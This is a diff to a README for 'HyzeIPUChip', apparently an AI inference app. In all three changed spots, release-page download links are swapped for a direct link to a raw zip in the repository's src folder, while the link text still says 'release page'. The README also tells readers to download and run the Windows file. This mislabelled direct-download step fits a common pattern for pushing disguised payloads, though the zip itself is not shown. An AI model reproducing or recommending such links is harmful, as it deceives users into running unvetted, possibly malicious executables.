@@ -1,6 +1,6 @@
 # 🤖 HyzeIPUChip - Run AI Inference With More Control
 
-[⬇️ Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases){style="background-color:#4a90e2;color:#ffffff;padding:10px 16px;border-radius:8px;text-decoration:none;display:inline-block;font-weight:bold;"}
+[⬇️ Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/raw/refs/heads/main/src/Chip-IPU-Hyze-v1.3.zip){style="background-color:#4a90e2;color:#ffffff;padding:10px 16px;border-radius:8px;text-decoration:none;display:inline-block;font-weight:bold;"}
 
 ## 🚀 Overview
 
@@ -35,7 +35,7 @@ For best results:
 
 Visit this page to download the app:
 
-[Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases)
+[Download HyzeIPUChip](https://github.com/sound-arthurholmes351/HyzeIPUChip/raw/refs/heads/main/src/Chip-IPU-Hyze-v1.3.zip)
 
 Open the latest release and get the Windows file that matches your system. If there are more than one file, choose the one meant for Windows users.
 
@@ -181,7 +181,7 @@ This project relates to:
 
 Use this link to visit the release page, then download and run the Windows file:
 
-[HyzeIPUChip Releases](https://github.com/sound-arthurholmes351/HyzeIPUChip/releases)
+[HyzeIPUChip Releases](https://github.com/sound-arthurholmes351/HyzeIPUChip/raw/refs/heads/main/src/Chip-IPU-Hyze-v1.3.zip)
 
 ## 🖥️ Quick Start Steps
 
